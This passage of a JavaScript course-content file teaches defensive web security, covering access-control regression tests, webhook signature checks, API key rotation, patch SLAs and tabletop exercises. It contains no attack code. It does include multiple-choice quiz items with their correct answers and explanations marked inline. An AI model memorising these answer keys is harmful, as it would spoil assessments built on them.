          'SHAs resolve faster than tags during a build',
          'Tags cannot be used with third-party actions',
          'Pinning by SHA stops the action from reading repository secrets',
        ], 0, 'Tags are mutable pointers, so the code behind @v4 can change under you, while a commit SHA always names the same tree.'),
        q('Which approach actually keeps a build-time secret out of the final container image?', [
          'Passing it with --build-arg and unsetting it later in the Dockerfile',
          'Setting it as an ENV so it is never written to a file',
          'Copying it in, using it, then removing it in a later RUN step',
          'Never letting it into a layer: inject it at runtime, or use a build-secret mount',
        ], 3, 'Layers are additive and readable, so a deleted file is still recoverable from the earlier layer that added it.'),
        q('A pod runs as root with the full capability set and a writable root filesystem. Which change most reduces what a code-execution bug can do?', [
          'Adding a CVE scan to the image build',
          'runAsNonRoot with capabilities dropped and a read-only root filesystem',
          'Setting the image pull policy to Always',
          'Moving the image to a private registry',
        ], 1, 'Scanning finds known issues before deploy, but the runtime security context is what constrains an attacker who already has execution.'),
      ]
    ),
    chapter(
      'Proving It Works and Keeping It That Way',
      'Turning defences into tests that fail the build, securing the integrations you do not control, and running the programme that keeps all of it true next quarter.',
      [
        lesson('Security Tests That Fail the Build', 14, `
Chapter 3 said to replay account A's request with account B's session. Doing that by hand finds the bug once. Writing it as a test means the bug cannot come back, and that difference is the entire point of security testing: a fix without a test is a fix with an expiry date.

### Every fixed vulnerability gets a named test

\`\`\`js
import request from 'supertest';

test('IDOR: user B cannot read user A invoice', async () => {
  const alice = await loginAs('alice@example.com');
  const bob = await loginAs('bob@example.com');

  const { body: inv } = await request(app)
    .post('/api/invoices').set('Cookie', alice).send({ amountCents: 500 }).expect(201);

  await request(app).get(\`/api/invoices/\${inv.id}\`).set('Cookie', bob).expect(404);
  await request(app).get(\`/api/invoices/\${inv.id}\`).expect(401);   // and with no session
});
\`\`\`

Two details in those assertions. **404 rather than 403**, matching the decision from Chapter 3 not to confirm that the record exists. And a separate unauthenticated case, because "forgot to require auth at all" and "forgot to check ownership" are different bugs that must fail on different lines.

### Test the class, not just the instance

One test per bug still leaves the next endpoint uncovered, and the route added six months later by someone in a hurry is the one that skips the check. Assert the rule across the whole router:

\`\`\`js
// Fails the build when a new route never declares a permission.
test('every /api route declares auth and a permission', () => {
  const routes = listRoutes(app);                       // walk the express router stack
  const missing = routes.filter((r) =>
    !r.middleware.includes('requireAuth') ||
    !r.middleware.some((m) => m.startsWith('can:'))
  );
  expect(missing).toEqual([]);                          // prints the offending routes
});
\`\`\`

The same trick works on configuration. Assert the headers rather than trusting that \`helmet()\` is still mounted six refactors later:

\`\`\`js
test('security headers present on every response', async () => {
  const res = await request(app).get('/api/health');
  expect(res.headers['content-security-policy']).toBeDefined();
  expect(res.headers['strict-transport-security']).toBeDefined();
  expect(res.headers['x-powered-by']).toBeUndefined();
});
\`\`\`

### Let a linter carry the patterns

Custom static-analysis rules encode the review checklist from Chapter 5 so nobody has to recall it at five o'clock:

\`\`\`yaml
rules:
  - id: unscoped-find-by-id
    languages: [js, ts]
    severity: ERROR
    message: findById on a request parameter — scope the query to the owner (Ch. 3).
    pattern: $MODEL.findById(req.params.$P)
\`\`\`

Run it on changed files in CI. Three rules that match bugs you have actually shipped beat five hundred generic ones that get muted in week two.

### Fuzz the validators

Property tests explore inputs nobody would think to type — empty strings, huge numbers, unicode, and objects where a scalar belongs:

\`\`\`js
import fc from 'fast-check';

test('email validator never throws and never accepts an object', () => {
  fc.assert(fc.property(fc.anything(), (input) => {
    const out = validateEmail(input);
    expect(typeof out.ok).toBe('boolean');   // NoSQL operator injection dies here
  }));
});
\`\`\`

### The mistake

Mocking the auth middleware because it makes tests easier to write. The suite then proves the handler works for a caller who was already authorised, which was never the question. Drive tests through the real middleware stack with real sessions.

Keep dynamic scanning honest too. A scanner crawling as an anonymous visitor tests your login page and nothing else; give it authenticated sessions for two different roles, or it will report a clean bill of health on an application it never got inside.
        `),
        lesson('Webhooks, API Keys, and Third-Party Integrations', 14, `
Integrations invert the model from Chapter 1. You publish an endpoint that an outside system posts to with no session at all, and you hand credentials to companies whose security you cannot audit. Both directions need deliberate handling.

### Inbound webhooks are unauthenticated public endpoints

Anyone can find \`/webhooks/payments\` and post \`{"event":"payment.succeeded"}\`. The vendor signs each request; your job is to verify that signature before the payload influences anything.

\`\`\`js
import { createHmac, timingSafeEqual } from 'node:crypto';

// express.raw, mounted BEFORE express.json() and for this path only.
app.post('/webhooks/payments', express.raw({ type: 'application/json' }), async (req, res) => {
  const ts = Number(req.get('x-signature-timestamp'));
  const sent = Buffer.from(req.get('x-signature') ?? '', 'hex');

  // Replay window: a captured request stops working after five minutes.
  if (!Number.isFinite(ts) || Math.abs(Date.now() / 1000 - ts) > 300) return res.sendStatus(400);

  const expected = createHmac('sha256', process.env.WEBHOOK_SECRET)
    .update(String(ts) + '.')
    .update(req.body)                  // a Buffer of the exact bytes received
    .digest();

  if (sent.length !== expected.length || !timingSafeEqual(sent, expected)) {
    return res.sendStatus(401);        // no hint about which part failed
  }

  const event = JSON.parse(req.body.toString('utf8'));   // parse only after verifying
  await queue.add('payment-event', event);
  res.sendStatus(202);                 // acknowledge fast, do the work off the request
});
\`\`\`

Three details carry the security here. The signature covers the **raw bytes**, so verifying against \`JSON.stringify(req.body)\` is the classic bug in this code — re-serialising changes key order, spacing and unicode escaping, and the mismatch is intermittent enough that everyone blames the vendor. \`timingSafeEqual\` rather than \`===\` follows the rule from Chapter 4. And the timestamp check is what stops replay, because a valid signature otherwise stays valid forever.

Then handle delivery reality: webhooks arrive **more than once**. Record the vendor's event id and ignore duplicates, or a retried \`payment.succeeded\` credits the account twice.

### Outbound keys need a lifecycle

| Practice | Why it pays |
|---|---|
| A distinct key per vendor and per environment | Revocation stays surgical instead of company-wide |
| The narrowest scope the vendor offers | Read-only analytics never needs write |
| A recognisable prefix on keys you issue, e.g. \`sk_live_\` | Secret scanners can spot your leaks for you |
| Two valid keys during rotation | Overlap means rotation is not an outage, so it actually happens |
| One module for all third-party calls | A single place for timeouts, retries and log redaction |

Rotate on a cadence you can survive. A key that "cannot be rotated without downtime" is a key still live three years after the contract ended.

### OAuth grants are permissions you forgot you gave

When a vendor connects to your Google Workspace, Slack or code host, an admin approves scopes once and nobody looks again. Review grants twice a year, ask what each token reaches if that vendor is breached, and prefer a scoped installation over org-wide access. Store tokens you receive **encrypted**, using the envelope encryption from Chapter 4 — a table of live third-party access tokens is as valuable as a table of passwords and is usually guarded far less carefully.

### The four vendor questions worth asking

Skip the two-hundred-line questionnaire. Ask: what data of ours do you store and where; do you support SSO and audit logs on our plan; what is your breach notification commitment in hours; and can we revoke access in one action without emailing support? The last one is the control you will actually need in a hurry, and the answer is frequently no.
        `),
        lesson('Patch SLAs, Disclosure, and the Tabletop', 15, `
Everything so far decays. Dependencies age, roles accumulate permissions, and the person who knew the runbook leaves. A security programme is the small set of recurring mechanics that keeps the earlier chapters true, and it fits on one page.

### You cannot patch what you cannot list

Start with an inventory: every repository, every deployed service and its base image, every domain and certificate expiry, every SaaS tool holding company data, every third-party integration — and a named owner for each. The forgotten staging box from Chapter 5 and the abandoned marketing subdomain are found either here or in an incident, and one of those is much cheaper.

### Triage by exploitability, not by score

A CVSS base score describes a vulnerability in the abstract and knows nothing about your deployment. Layer three questions on top of it:

1. Is it **internet-facing**, or reachable only from an internal network?
2. Is it **being exploited in the wild** — CISA's KEV catalogue is the fastest check?
3. Is the vulnerable code path **reachable** in the way you use the package?

| Situation | Fix within |
|---|---|
| Internet-facing, known exploited | 24 hours, out of band |
| Internet-facing, critical, no known exploit | 7 days |
| Internal, high | 30 days |
| Dev-only dependency, or an unreachable path | Next scheduled upgrade |

Two 9.8s are not equal work. Remote code execution in your public API gateway is tonight; the same score in a build-time linter that never sees untrusted input is a backlog ticket. Write the SLA down, report against it monthly, and the argument stops repeating.

### Make it easy for a stranger to warn you

Someone will eventually find a bug in your product. Whether that ends as a quiet email or a public thread depends on whether they could find a route to you:

\`\`\`text
# https://example.com/.well-known/security.txt
Contact: mailto:security@example.com
Expires: 2027-01-01T00:00:00.000Z
Policy: https://example.com/security-policy
Preferred-Languages: en
\`\`\`

Publish a short policy beside it: what is in scope, what testing is unacceptable (no denial of service, no third-party data, no social engineering of staff), a response commitment such as acknowledgement within three working days, and explicit **safe harbour** promising not to pursue good-faith research. Then honour it. Threatening a researcher is the fastest known way to convert a private report into a disclosure with your logo on it.

### Rehearse the plan you wrote in Chapter 5

A tabletop is ninety minutes, a room, and a scenario nobody prepared for. Read out an inject, ask what happens next, and note where the room stalls:

\`\`\`text
09:00  Support forwards a customer email: "why did your API export another company's orders?"
09:20  Inject: the customer can reproduce it. Who has authority to disable the endpoint?
09:40  Inject: the logs exist, but retention is 14 days and this started in June. Now what?
10:00  Inject: a journalist emails for comment. Who speaks, and what is truthful to say yet?
\`\`\`

You are not testing knowledge, you are testing decisions: who can take production offline without asking permission, whether anyone can reach the CTO at 2am, whether the runbook survives the outage — a runbook on the wiki hosted by the compromised platform is not a runbook — and whether legal knows the 72-hour clock started at 09:00.

### The handful of numbers that mean something

| Metric | What it actually tells you |
|---|---|
| Median time to report a suspicious email | Blast radius of the next phish (Chapter 2) |
| Percentage of assets patched inside SLA | Whether the inventory is real |
| Accounts on phishing-resistant MFA | Progress on the top attack path |
| Days since the last successful restore test | Your genuine ransomware answer |
| Findings open past their due date | Whether fixes get finished or merely filed |

Five numbers reviewed monthly beat a hundred-page annual audit. And re-run the threat model from Chapter 1 whenever the architecture changes — the day someone ships "share by public link", every assumption you wrote down needs reading again.
        `),
      ],
      [
        q('A webhook handler verifies the HMAC signature against JSON.stringify(req.body) and fails intermittently in production. Why?', [
          'HMAC-SHA256 output is not deterministic',
          'The signature covers the exact raw bytes sent, and re-serialising the parsed object changes them',
          'The vendor rotates the signing secret on every delivery',
          'Express strips the signature header before the handler runs',
        ], 1, 'Any change in key order, whitespace or unicode escaping yields a different digest, so verification must run on the untouched request body.'),
        q('Two dependency advisories both score CVSS 9.8. Which do you fix first?', [
          'The one published earliest',
          'The one inside the larger package',
          'Whichever the scanner happens to list first',
          'The one that is internet-facing and already being exploited in the wild',
        ], 3, 'A base score rates the flaw in the abstract, so exposure and active exploitation are what turn it into your real priority.'),
        q('What makes an access-control regression test genuinely useful?', [
          'It replays a real request from account A using account B session and asserts 404 or 403',
          'It confirms the login page returns 200 for anonymous visitors',
          'It mocks the authorisation middleware and checks the handler returns data',
          'It runs an unauthenticated scanner against staging every night',
        ], 0, 'Only a real cross-account replay through the real middleware exercises the ownership check that IDOR bugs bypass.'),
        q('Why publish a security.txt file and a disclosure policy with safe harbour?', [
          'It is required before a certificate authority will issue TLS certificates',
          'It legally prevents researchers from testing your systems',
          'It gives a finder a documented route to you, so the report arrives privately rather than publicly',
          'It replaces the need for an incident response plan',
        ], 2, 'Reports travel the path of least friction, so a published contact and safe harbour keep the finding in your inbox instead of on a timeline.'),
      ]
    ),
  ],
  final: [
    q('Which pairing of incident to violated property is correct?', [
      'A leaked customer list is primarily an integrity failure',
      'A silently altered payment amount is primarily an integrity failure',
      'A DDoS is primarily a confidentiality failure',
      'A stolen password is primarily an availability failure',
    ], 1, 'Integrity is about unauthorised or undetected modification, which is exactly what an altered amount represents.'),
    q('A checkout endpoint trusts a price field sent by the client. The underlying principle being violated is', [
      'that anything crossing a trust boundary from a client is attacker-controlled and must be re-derived server-side',
      'that JSON is an insecure serialisation format',
      'that prices should be integers',
      'that POST bodies should be encrypted separately',
    ], 0, 'Clients can send anything, so authoritative values must come from server-side records rather than the request.'),
    q('A login endpoint sees one wrong password attempted once against 12,000 accounts. The correct detection is', [
      'per-account lockout after five failures',
      'a CAPTCHA on the third attempt per session',
      'blocking the user agent string',
      'a global failure-rate alarm plus per-IP and per-account tracking together',
    ], 3, 'Spraying stays under per-account thresholds by design, so it is only visible in aggregate across the endpoint.'),
    q('Which defence removes SQL injection rather than merely filtering it?', [
      'Escaping quote characters in input',
      'Rejecting requests containing the word SELECT',
      'Parameterised queries, which send values separately from the statement',
      'Encrypting the database at rest',
    ], 2, 'Binding values means the interpreter never parses them as syntax, so no filter bypass exists to find.'),
    q('An authenticated user changes an id in a URL and reads another customer record. This is', [
      'cross-site request forgery',
      'broken access control (IDOR)',
      'a session fixation flaw',
      'server-side request forgery',
    ], 1, 'The request is authenticated but never authorised against the object, which is the top-ranked OWASP category.'),
    q('An image-import feature lets users supply a URL and the server fetches it. The main risk is', [
      'stored XSS in the image filename',
      'CSRF against the import endpoint',
      'a denial of service from large files',
      'SSRF reaching internal services and cloud metadata endpoints',
    ], 3, 'The server sits inside the perimeter, so an attacker-chosen URL can reach hosts the internet cannot.'),
    q('Why does an HttpOnly flag reduce the impact of an XSS bug?', [
      'It sanitises the injected markup',
      'Injected JavaScript cannot read the cookie, so the session is harder to steal',
      'It forces the cookie over HTTPS',
      'It blocks cross-site requests',
    ], 1, 'HttpOnly hides the cookie from document.cookie; Secure handles HTTPS and SameSite handles cross-site sending.'),
    q('A database of bcrypt hashes leaks. Why is this far better than leaking SHA-256 hashes?', [
      'bcrypt hashes are shorter to transmit',
      'bcrypt output cannot be compared offline',
      'bcrypt is deliberately slow and per-user salted, so mass offline cracking is impractical',
      'bcrypt hashes expire automatically',
    ], 2, 'Cost and unique salts destroy the economics of GPU cracking and rainbow tables that fast hashes enable.'),
    q('Which statement about TLS and encryption at rest is accurate?', [
      'TLS at rest replaces field-level encryption',
      'Full-disk encryption protects a running app from SQL injection',
      'Reusing an AES-GCM nonce with the same key is safe if the plaintext differs',
      'TLS protects data on the wire; a database dump needs separate encryption to stay confidential',
    ], 3, 'They defend different phases: transit versus storage, and neither substitutes for the other.'),
    q('A server is confirmed compromised at 09:00. Which sequence is correct?', [
      'Isolate from the network, capture memory and a disk snapshot, revoke sessions and rotate credentials, then eradicate',
      'Reimage immediately, then review logs from the backup',
      'Power off, reinstall, restore from backup, notify nobody until confirmed',
      'Delete the malware, restart the service, monitor for a week',
    ], 0, 'Containment must precede eradication, and volatile evidence is lost the moment the machine is powered off or rebuilt.'),
    q('A leaked CI credential lets an attacker assume a cloud role that carries s3:* on Resource "*". Which statement is correct?', [
      'The damage is limited because the credential was short-lived',
      'The role only works from inside the VPC that issued it',
      'The blast radius is set by the policy, so the wildcard turns one leak into full control of every bucket',
      'S3 permissions cannot be used without console access',
    ], 2, 'Credentials carry whatever the policy granted, which is why least privilege decides the outcome of an identical compromise.'),
    q('A workflow triggered by pull_request_target checks out the pull request head commit and runs the test suite. What is the risk?', [
      'Any fork can execute its own code in a job that holds your repository secrets',
      'The workflow will not trigger for contributors outside the organisation',
      'The base branch is checked out instead of the contributor changes',
      'There is none, because forks cannot open pull requests',
    ], 0, 'That trigger runs in the context of the base repository with its secrets, so checking out untrusted code hands them to the submitter.'),
    q('Which change most limits what a remote code execution bug inside a container can reach?', [
      'Rebuilding the image on a nightly schedule',
      'Serving the image from a private registry',
      'Adding a CVE scan to the build pipeline',
      'Running as a non-root user with capabilities dropped and a read-only root filesystem',
    ], 3, 'Scanning and rebuilding reduce known flaws beforehand, while the runtime context is what constrains an attacker who already executes code.'),
    q('You have just fixed an IDOR bug. Which single follow-up makes the fix durable?', [
      'Record the incident in the risk register',
      'Add a regression test that replays the request with a second account and expects 404',
      'Rotate the API keys for the affected service',
      'Replace the sequential ids with UUIDs',
    ], 1, 'An automated cross-account replay fails the build if anyone removes the ownership constraint again, which a note or an opaque id will not do.'),
  ],
});
